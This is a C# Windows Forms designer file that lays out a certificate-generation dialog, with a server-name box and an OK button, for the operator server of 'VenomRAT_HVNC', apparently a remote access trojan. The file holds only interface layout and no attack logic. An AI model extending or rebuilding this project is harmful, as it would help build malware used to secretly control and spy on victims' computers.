namespace VenomRAT_HVNC.Server.Forms
{
	public partial class FormCertificate : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.Server.Forms.FormCertificate));
			this.label1 = new global::System.Windows.Forms.Label();
			this.guna2DragControl1 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.panel2 = new global::System.Windows.Forms.Panel();
			this.label2 = new global::System.Windows.Forms.Label();
			this.guna2Separator1 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2ShadowPanel1 = new global::Guna.UI2.WinForms.Guna2ShadowPanel();
			this.textBox1 = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.button1 = new global::Guna.UI2.WinForms.Guna2Button();
			this.guna2ControlBox2 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.guna2ShadowPanel2 = new global::Guna.UI2.WinForms.Guna2ShadowPanel();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.panel2.SuspendLayout();
			this.guna2ShadowPanel1.SuspendLayout();
			this.guna2ShadowPanel2.SuspendLayout();
			base.SuspendLayout();
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.label1.Location = new global::System.Drawing.Point(97, 54);
			this.label1.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(81, 16);
			this.label1.TabIndex = 119;
			this.label1.Text = "Sever name";
			this.guna2DragControl1.TargetControl = this.panel2;
			this.panel2.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.panel2.Controls.Add(this.label2);
			this.panel2.Controls.Add(this.guna2Separator1);
			this.panel2.Controls.Add(this.guna2ShadowPanel1);
			this.panel2.Controls.Add(this.guna2ControlBox2);
			this.panel2.Location = new global::System.Drawing.Point(9, 10);
			this.panel2.Name = "panel2";
			this.panel2.Size = new global::System.Drawing.Size(697, 377);
			this.panel2.TabIndex = 7;
			this.label2.AutoSize = true;
			this.label2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label2.ForeColor = global::System.Drawing.Color.White;
			this.label2.Location = new global::System.Drawing.Point(34, 15);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(260, 20);
			this.label2.TabIndex = 129;
			this.label2.Text = "Venom Remote Administration Tool";
			this.guna2Separator1.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator1.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator1.FillThickness = 2;
			this.guna2Separator1.Location = new global::System.Drawing.Point(0, 49);
			this.guna2Separator1.Name = "guna2Separator1";
			this.guna2Separator1.Size = new global::System.Drawing.Size(697, 20);
			this.guna2Separator1.TabIndex = 128;
			this.guna2ShadowPanel1.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ShadowPanel1.Controls.Add(this.textBox1);
			this.guna2ShadowPanel1.Controls.Add(this.button1);
			this.guna2ShadowPanel1.Controls.Add(this.label1);
			this.guna2ShadowPanel1.FillColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.guna2ShadowPanel1.Location = new global::System.Drawing.Point(38, 93);
			this.guna2ShadowPanel1.Name = "guna2ShadowPanel1";
			this.guna2ShadowPanel1.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ShadowPanel1.ShadowShift = 8;
			this.guna2ShadowPanel1.Size = new global::System.Drawing.Size(619, 248);
			this.guna2ShadowPanel1.TabIndex = 127;
			this.textBox1.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.textBox1.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.textBox1.DefaultText = "VenomRAT Server";
			this.textBox1.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.textBox1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.textBox1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textBox1.DisabledState.Parent = this.textBox1;
			this.textBox1.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textBox1.FillColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.textBox1.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.textBox1.FocusedState.Parent = this.textBox1;
			this.textBox1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.textBox1.ForeColor = global::System.Drawing.Color.White;
			this.textBox1.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.textBox1.HoverState.Parent = this.textBox1;
			this.textBox1.Location = new global::System.Drawing.Point(100, 89);
			this.textBox1.Name = "textBox1";
			this.textBox1.PasswordChar = '\0';
			this.textBox1.PlaceholderText = "";
			this.textBox1.SelectedText = "";
			this.textBox1.SelectionStart = 15;
			this.textBox1.ShadowDecoration.Parent = this.textBox1;
			this.textBox1.Size = new global::System.Drawing.Size(396, 34);
			this.textBox1.TabIndex = 128;
			this.button1.Animated = true;
			this.button1.BorderColor = global::System.Drawing.Color.Maroon;
			this.button1.CheckedState.Parent = this.button1;
			this.button1.CustomImages.Parent = this.button1;
			this.button1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.button1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.button1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.button1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.button1.DisabledState.Parent = this.button1;
			this.button1.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.button1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.button1.ForeColor = global::System.Drawing.Color.White;
			this.button1.HoverState.Parent = this.button1;
			this.button1.Location = new global::System.Drawing.Point(100, 145);
			this.button1.Name = "button1";
			this.button1.ShadowDecoration.Parent = this.button1;
			this.button1.Size = new global::System.Drawing.Size(396, 37);
			this.button1.TabIndex = 127;
			this.button1.Text = "OK";
			this.button1.Click += new global::System.EventHandler(this.Button1_Click);
			this.guna2ControlBox2.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox2.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox2.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox2.HoverState.Parent = this.guna2ControlBox2;
			this.guna2ControlBox2.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox2.Location = new global::System.Drawing.Point(653, 12);
			this.guna2ControlBox2.Name = "guna2ControlBox2";
			this.guna2ControlBox2.ShadowDecoration.Parent = this.guna2ControlBox2;
			this.guna2ControlBox2.Size = new global::System.Drawing.Size(41, 32);
			this.guna2ControlBox2.TabIndex = 10;
			this.guna2ShadowPanel2.BackColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ShadowPanel2.Controls.Add(this.panel2);
			this.guna2ShadowPanel2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.guna2ShadowPanel2.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2ShadowPanel2.Location = new global::System.Drawing.Point(0, 0);
			this.guna2ShadowPanel2.Name = "guna2ShadowPanel2";
			this.guna2ShadowPanel2.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ShadowPanel2.ShadowDepth = 8;
			this.guna2ShadowPanel2.ShadowShift = 2;
			this.guna2ShadowPanel2.Size = new global::System.Drawing.Size(713, 395);
			this.guna2ShadowPanel2.TabIndex = 9;
			this.guna2BorderlessForm1.AnimateWindow = true;
			this.guna2BorderlessForm1.AnimationType = global::Guna.UI2.WinForms.Guna2BorderlessForm.AnimateWindowType.AW_VER_POSITIVE;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(39, 39, 39);
			base.ClientSize = new global::System.Drawing.Size(713, 395);
			base.ControlBox = false;
			base.Controls.Add(this.guna2ShadowPanel2);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "FormCertificate";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Certificate";
			base.Load += new global::System.EventHandler(this.FormCertificate_Load);
			this.panel2.ResumeLayout(false);
			this.panel2.PerformLayout();
			this.guna2ShadowPanel1.ResumeLayout(false);
			this.guna2ShadowPanel1.PerformLayout();
			this.guna2ShadowPanel2.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		private global::System.ComponentModel.IContainer components;

		private global::System.Windows.Forms.Label label1;

		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl1;

		private global::System.Windows.Forms.Panel panel2;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator1;

		private global::Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel1;

		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox2;

		private global::Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel2;

		private global::Guna.UI2.WinForms.Guna2Button button1;

		private global::System.Windows.Forms.Label label2;

		private global::Guna.UI2.WinForms.Guna2TextBox textBox1;

		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;
	}
}
